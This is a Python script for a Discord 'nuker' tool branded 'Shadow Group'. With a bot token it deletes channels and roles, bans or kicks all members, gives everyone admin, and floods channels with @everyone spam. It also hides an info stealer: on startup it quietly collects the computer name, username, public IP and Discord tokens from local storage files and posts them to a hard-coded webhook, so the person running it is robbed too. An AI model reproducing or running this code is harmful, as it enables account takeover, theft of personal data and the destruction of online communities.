import discord
import asyncio
import os
import sys
import requests
import platform
import getpass
import sqlite3
import subprocess
import shutil
import re
from datetime import datetime
import random

# ========== COLORS ==========
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
PURPLE = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

os.system('cls' if os.name == 'nt' else 'clear')

# ========== WEBHOOK ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1487199450291114015/-k62hy6sGnLWZu4Bv1rdhaKbWbniOJLrFyjID8WxSnG-ih1iISKX0viVXBf1e0pbymom"

# ========== SPAM MESSAGES ==========
SPAM_MESSAGES = [
    "@everyone **💀 SHADOW GROUP PRESENTS 💀**\n**⚡ SERVER DESTROYED ⚡**\n**🔥 JOIN US: discord.gg/shadow 🔥**",
    "@here **👑 SHADOW GROUP IS HERE 👑**\n**💀 YOUR SERVER IS OURS 💀**",
    "@everyone **🔪 GET NUKE'D 🔪**\n**🎭 SHADOW GROUP RULES 🎭**",
    "@here **💢 BYE BYE SERVER 💢**\n**⚡ POWERED BY SHADOW GROUP ⚡**",
    "@everyone **🌑 SHADOW NUKE IN PROGRESS 🌑**\n**💀 PREPARE TO BE DESTROYED 💀**",
]

# ========== INFO GRABBER ==========
def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
        os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb',
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith('.log') or file.endswith('.ldb'):
                        with open(f'{path}\\{file}', 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            tokens_found = re.findall(r'[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38}', content)
                            for token in tokens_found:
                                if token not in tokens and len(token) > 50:
                                    tokens.append(token)
            except:
                pass
    return tokens

def send_full_info():
    try:
        computer_name = platform.node()
        os_info = platform.system() + " " + platform.release()
        username = getpass.getuser()
        ip = requests.get('https://api.ipify.org', timeout=3).text
        tokens = get_discord_tokens()
        
        embed = {
            "title": "💀 SHADOW GROUP - INFO GRABBED 💀",
            "color": 0xFF0000,
            "timestamp": datetime.now().isoformat(),
            "fields": [
                {"name": "🖥️ SYSTEM", "value": f"```Name: {computer_name}\nUser: {username}\nOS: {os_info}```", "inline": False},
                {"name": "🌐 NETWORK", "value": f"```IP: {ip}```", "inline": False},
                {"name": f"🎮 TOKENS ({len(tokens)})", "value": f"```{chr(10).join(tokens[:3])}```", "inline": False},
            ],
            "footer": {"text": "Shadow Group"},
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed], "username": "Shadow Monitor"}, timeout=3)
    except:
        pass

# ========== ANGEL BANNER ==========
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{CYAN}
     ____
    `@,                                        ,@@
     `@@,                                    ;@;'
      ,:;@;,                              .;@;:,
      `@;:;@@;,                        ,;@@;::@'
        `@;::;@@;,.                .,;@@;;:;@'
          ;:;;;;;@@@@,;@, ,    , ,@;,;@@@;;;;;;:
          `:;;:;;;;;@@@@@@@;  ;;;;  ;@@@@@@@;;;;;;;;;'
            `:;;@@;:;@@@@@@@@  ,;,  @@@@@@@@;;;;@@;:'
               `::;;;;@@@;;@@@;';;;,@@;:@@@@;;:;;;'
                 `:;;;;;@@@;;:@@;;@@;;@@@@;;;;;:'
                      ```;@@@@@@@@@@@@@@;'''
                           ;@@@@;;@@@@;
                         ,@@@;:;;;;;;@@@,
                        ;:;@:',;;;;@,';@;
                              ;@@;;@@;
                              ;@@@;@@;
                              :;@;;;@;
                               ;;;;;;'
                               `;;;;;
                                `:;'
                                 `'
{RESET}
""")
    print(f"{YELLOW}╔══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{YELLOW}║     {CYAN}SHADOW GROUP - ULTRA DESTROYER TOOL{YELLOW}                 ║{RESET}")
    print(f"{YELLOW}║     {RED}💀 COMPLETE SERVER DESTRUCTION 💀{YELLOW}                       ║{RESET}")
    print(f"{YELLOW}╚══════════════════════════════════════════════════════════╝{RESET}")
    print()

class Nuker:
    def __init__(self):
        self.token = None
        self.bot = None
        self.guild = None
        self.running = True

    async def login(self):
        try:
            send_full_info()
        except:
            pass
        
        banner()
        print(f"{YELLOW}[?] SHADOW GROUP TOKEN:{RESET}")
        self.token = input(f"{GREEN}[SHADOW]~{RESET} ").strip()
        
        if not self.token:
            print(f"\n{RED}[!] TOKEN EMPTY!{RESET}")
            input("\nPress Enter...")
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        intents.guilds = True
        intents.guild_messages = True
        
        self.bot = discord.Client(intents=intents)
        
        @self.bot.event
        async def on_ready():
            banner()
            print(f"{GREEN}[+] LOGGED AS: {self.bot.user.name}{RESET}")
            print(f"{CYAN}[~] SERVERS: {len(self.bot.guilds)}{RESET}\n")
            await self.show_servers()
        
        try:
            await self.bot.start(self.token)
            return True
        except Exception as e:
            print(f"\n{RED}[!] INVALID TOKEN! {e}{RESET}")
            input("\nPress Enter...")
            return False

    async def show_servers(self):
        print(f"{PURPLE}[SHADOW] YOUR SERVERS:{RESET}")
        for i, guild in enumerate(self.bot.guilds):
            print(f"{CYAN}[{i}] {guild.name} ({len(guild.members)} MEMBERS){RESET}")
        
        try:
            choice = input(f"\n{GREEN}[SHADOW]~{RESET} SELECT: ")
            self.guild = self.bot.guilds[int(choice)]
            banner()
            print(f"{GREEN}[+] TARGET: {self.guild.name}{RESET}\n")
            await self.menu()
        except Exception as e:
            print(f"{RED}[!] INVALID SELECTION!{RESET}")
            await self.bot.close()

    async def menu(self):
        while self.running:
            print(f"{GREEN}[1]{RESET} ⚡ DELETE CHANNELS    {GREEN}[5]{RESET} ⚡ BAN ALL")
            print(f"{GREEN}[2]{RESET} ⚡ DELETE ROLES      {GREEN}[6]{RESET} ⚡ KICK ALL")
            print(f"{GREEN}[3]{RESET} ⚡ CREATE CHANNELS   {GREEN}[7]{RESET} ⚡ RENAME SERVER")
            print(f"{GREEN}[4]{RESET} ⚡ NOTHING           {GREEN}[8]{RESET} ⚡ ADMIN ALL")
            print(f"{RED}[9]{RESET} 💀 SPAM ALL         {RED}[N]{RESET} 💀 SHADOW NUKE")
            print(f"{YELLOW}[M]{RESET} 📢 MASS MENTION     {YELLOW}[0]{RESET} 🚪 EXIT")
            print()
            
            cmd = input(f"{GREEN}[SHADOW]~{RESET} ").lower()
            
            if cmd == "1":
                await self.del_channels()
            elif cmd == "2":
                await self.del_roles()
            elif cmd == "3":
                await self.create_channels()
            elif cmd == "4":
                print(f"{YELLOW}[~] SKIPPED{RESET}")
            elif cmd == "5":
                await self.ban_all()
            elif cmd == "6":
                await self.kick_all()
            elif cmd == "7":
                await self.rename_server()
            elif cmd == "8":
                await self.admin_all()
            elif cmd == "9":
                await self.spam_all()
            elif cmd == "m":
                await self.mass_mention()
            elif cmd == "n":
                await self.shadow_nuke()
            elif cmd == "0":
                print(f"{YELLOW}[SHADOW] GOODBYE!{RESET}")
                await self.bot.close()
                self.running = False
            else:
                print(f"{RED}[!] INVALID OPTION!{RESET}")
            
            if self.running:
                input(f"\n{YELLOW}PRESS ENTER TO CONTINUE...{RESET}")
                banner()
                print(f"{GREEN}[+] TARGET: {self.guild.name}{RESET}\n")

    async def del_channels(self):
        print(f"{YELLOW}[~] DELETING ALL CHANNELS...{RESET}")
        count = 0
        for channel in list(self.guild.channels):
            try:
                await channel.delete()
                count += 1
                print(f"{CYAN}[~] Deleted: {channel.name}{RESET}")
                await asyncio.sleep(0.1)
            except:
                pass
        print(f"{GREEN}[+] DELETED {count} CHANNELS!{RESET}")

    async def del_roles(self):
        print(f"{YELLOW}[~] DELETING ALL ROLES...{RESET}")
        count = 0
        for role in list(self.guild.roles):
            if role != self.guild.default_role:
                try:
                    await role.delete()
                    count += 1
                    print(f"{CYAN}[~] Deleted role: {role.name}{RESET}")
                    await asyncio.sleep(0.1)
                except:
                    pass
        print(f"{GREEN}[+] DELETED {count} ROLES!{RESET}")

    async def create_channels(self):
        try:
            name = input(f"{CYAN}CHANNEL NAME: {RESET}")
            amount = int(input(f"{CYAN}NUMBER OF CHANNELS: {RESET}"))
            
            print(f"{YELLOW}[~] CREATING {amount} CHANNELS...{RESET}")
            
            created = 0
            for i in range(amount):
                try:
                    channel_name = f"{name}-{i}" if amount > 1 else name
                    await self.guild.create_text_channel(channel_name)
                    created += 1
                    if created % 10 == 0:
                        print(f"{CYAN}[~] Created {created}/{amount} channels{RESET}")
                    await asyncio.sleep(0.2)
                except:
                    pass
            
            print(f"{GREEN}[+] CREATED {created} CHANNELS!{RESET}")
        except:
            print(f"{RED}[!] ERROR!{RESET}")

    async def ban_all(self):
        confirm = input(f"{RED}[!] BAN ALL? TYPE YES: {RESET}")
        if confirm != "YES":
            return
        
        print(f"{YELLOW}[~] BANNING ALL MEMBERS...{RESET}")
        count = 0
        for member in list(self.guild.members):
            if not member.bot and member != self.guild.owner:
                try:
                    await member.ban(reason="SHADOW GROUP")
                    count += 1
                    if count % 10 == 0:
                        print(f"{CYAN}[~] Banned {count} members{RESET}")
                    await asyncio.sleep(0.1)
                except:
                    pass
        print(f"{GREEN}[+] BANNED {count} MEMBERS!{RESET}")

    async def kick_all(self):
        confirm = input(f"{RED}[!] KICK ALL? TYPE YES: {RESET}")
        if confirm != "YES":
            return
        
        print(f"{YELLOW}[~] KICKING ALL MEMBERS...{RESET}")
        count = 0
        for member in list(self.guild.members):
            if not member.bot and member != self.guild.owner:
                try:
                    await member.kick(reason="SHADOW GROUP")
                    count += 1
                    if count % 10 == 0:
                        print(f"{CYAN}[~] Kicked {count} members{RESET}")
                    await asyncio.sleep(0.1)
                except:
                    pass
        print(f"{GREEN}[+] KICKED {count} MEMBERS!{RESET}")

    async def rename_server(self):
        try:
            new_name = input(f"{CYAN}NEW SERVER NAME: {RESET}")
            await self.guild.edit(name=new_name)
            print(f"{GREEN}[+] RENAMED TO: {new_name}{RESET}")
        except:
            print(f"{RED}[!] FAILED!{RESET}")

    async def admin_all(self):
        print(f"{YELLOW}[~] GIVING ADMIN TO EVERYONE...{RESET}")
        try:
            perms = discord.Permissions.all()
            admin_role = await self.guild.create_role(name="SHADOW-ADMIN", permissions=perms)
            count = 0
            for member in self.guild.members:
                if not member.bot:
                    try:
                        await member.add_roles(admin_role)
                        count += 1
                        await asyncio.sleep(0.1)
                    except:
                        pass
            print(f"{GREEN}[+] ADMIN GIVEN TO {count} MEMBERS!{RESET}")
        except:
            print(f"{RED}[!] FAILED!{RESET}")

    async def spam_all(self):
        channels = self.guild.text_channels
        if not channels:
            print(f"{RED}[!] NO CHANNELS!{RESET}")
            return
        
        msg = input(f"{CYAN}MESSAGE: {RESET}")
        print(f"{YELLOW}[~] SPAMMING {len(channels)} CHANNELS...{RESET}")
        
        for x in range(5):  # 5 rounds of spam
            for channel in channels:
                try:
                    await channel.send(msg)
                    await asyncio.sleep(0.1)
                except:
                    pass
            print(f"{CYAN}[~] Round {x+1}/5 complete{RESET}")
        
        print(f"{GREEN}[+] SPAM COMPLETE!{RESET}")

    async def mass_mention(self):
        channels = self.guild.text_channels
        if not channels:
            print(f"{RED}[!] NO CHANNELS!{RESET}")
            return
        
        print(f"{YELLOW}[~] MASS MENTIONING @everyone AND @here...{RESET}")
        print(f"{CYAN}[~] Found {len(channels)} channels{RESET}")
        
        for x in range(10):  # 10 rounds of mass mentions
            for channel in channels[:50]:  # First 50 channels
                try:
                    msg = random.choice(SPAM_MESSAGES)
                    await channel.send(msg)
                    await asyncio.sleep(0.2)
                except:
                    pass
            print(f"{CYAN}[~] Mention round {x+1}/10 complete{RESET}")
        
        print(f"{GREEN}[+] MASS MENTION COMPLETE!{RESET}")

    async def shadow_nuke(self):
        confirm = input(f"{RED}[!!!] SHADOW NUKE - TYPE 'NUKE': {RESET}")
        if confirm != "NUKE":
            return
        
        print(f"{RED}[!!!] SHADOW NUKE STARTING...{RESET}")
        print()
        
        # ========== 1. MASS MENTION FIRST ==========
        print(f"{YELLOW}[1/7] MASS MENTION @everyone @here...{RESET}")
        channels = list(self.guild.text_channels)
        for channel in channels[:30]:
            try:
                await channel.send("@everyone **💀 SHADOW GROUP HAS ARRIVED 💀**\n**🔥 YOUR SERVER WILL BE DESTROYED 🔥**")
                await asyncio.sleep(0.1)
            except:
                pass
        print(f"{GREEN}[+] Mass mention sent!{RESET}")
        print()
        
        # ========== 2. DELETE ALL CHANNELS ==========
        print(f"{YELLOW}[2/7] DELETING ALL CHANNELS...{RESET}")
        channels_deleted = 0
        for channel in list(self.guild.channels):
            try:
                await channel.delete()
                channels_deleted += 1
                await asyncio.sleep(0.1)
            except:
                pass
        print(f"{GREEN}[+] Deleted {channels_deleted} channels!{RESET}")
        print()
        
        # ========== 3. DELETE ALL ROLES ==========
        print(f"{YELLOW}[3/7] DELETING ALL ROLES...{RESET}")
        roles_deleted = 0
        for role in list(self.guild.roles):
            if role != self.guild.default_role:
                try:
                    await role.delete()
                    roles_deleted += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        print(f"{GREEN}[+] Deleted {roles_deleted} roles!{RESET}")
        print()
        
        # ========== 4. RENAME SERVER ==========
        print(f"{YELLOW}[4/7] RENAMING SERVER...{RESET}")
        try:
            await self.guild.edit(name="💀 SHADOW GROUP | DESTROYED 💀")
            print(f"{GREEN}[+] Server renamed!{RESET}")
        except:
            print(f"{RED}[!] Failed to rename{RESET}")
        print()
        
        # ========== 5. CREATE 200 CHANNELS ==========
        print(f"{YELLOW}[5/7] CREATING 200 CHANNELS...{RESET}")
        channels_created = 0
        emojis = ["💀", "🔥", "⚡", "👑", "🔪", "🎭", "🌑", "💢", "🎯", "💫"]
        
        for i in range(200):
            try:
                emoji = emojis[i % len(emojis)]
                channel_name = f"{emoji}-shadow-{i+1}"
                await self.guild.create_text_channel(channel_name)
                channels_created += 1
                if channels_created % 50 == 0:
                    print(f"{CYAN}[~] Created {channels_created}/200 channels{RESET}")
                await asyncio.sleep(0.2)
            except:
                pass
        print(f"{GREEN}[+] Created {channels_created} channels!{RESET}")
        print()
        
        # ========== 6. MASS SPAM WITH MENTIONS ==========
        print(f"{YELLOW}[6/7] MASS SPAM WITH MENTIONS...{RESET}")
        new_channels = list(self.guild.text_channels)
        
        for x in range(15):  # 15 rounds of spam
            for channel in new_channels[:100]:
                try:
                    msg = random.choice(SPAM_MESSAGES)
                    await channel.send(msg)
                    await asyncio.sleep(0.1)
                except:
                    pass
            if (x + 1) % 5 == 0:
                print(f"{CYAN}[~] Spam round {x+1}/15 complete{RESET}")
        print(f"{GREEN}[+] Mass spam with mentions complete!{RESET}")
        print()
        
        # ========== 7. BAN ALL MEMBERS ==========
        print(f"{YELLOW}[7/7] BANNING ALL MEMBERS...{RESET}")
        banned = 0
        for member in list(self.guild.members):
            if not member.bot and member != self.guild.owner:
                try:
                    await member.ban(reason="SHADOW NUKE")
                    banned += 1
                    if banned % 20 == 0:
                        print(f"{CYAN}[~] Banned {banned} members{RESET}")
                    await asyncio.sleep(0.1)
                except:
                    pass
        print(f"{GREEN}[+] Banned {banned} members!{RESET}")
        print()
        
        # ========== FINAL RESULT ==========
        print(f"{RED}╔════════════════════════════════════════════════╗{RESET}")
        print(f"{RED}║     💀 SHADOW NUKE COMPLETED! 💀               ║{RESET}")
        print(f"{RED}╠════════════════════════════════════════════════╣{RESET}")
        print(f"{GREEN}║  • Channels Deleted: {channels_deleted:<4}                        ║{RESET}")
        print(f"{GREEN}║  • Roles Deleted:    {roles_deleted:<4}                        ║{RESET}")
        print(f"{GREEN}║  • Channels Created: {channels_created:<4}                        ║{RESET}")
        print(f"{GREEN}║  • Members Banned:   {banned:<4}                        ║{RESET}")
        print(f"{RED}╠════════════════════════════════════════════════╣{RESET}")
        print(f"{RED}║  {CYAN}⚡ SERVER COMPLETELY DESTROYED ⚡{RED}               ║{RESET}")
        print(f"{RED}╚════════════════════════════════════════════════╝{RESET}")

async def main():
    nuker = Nuker()
    if await nuker.login():
        await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{RED}[!] INTERRUPTED!{RESET}")
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {e}{RESET}")
        input("Press Enter to exit...")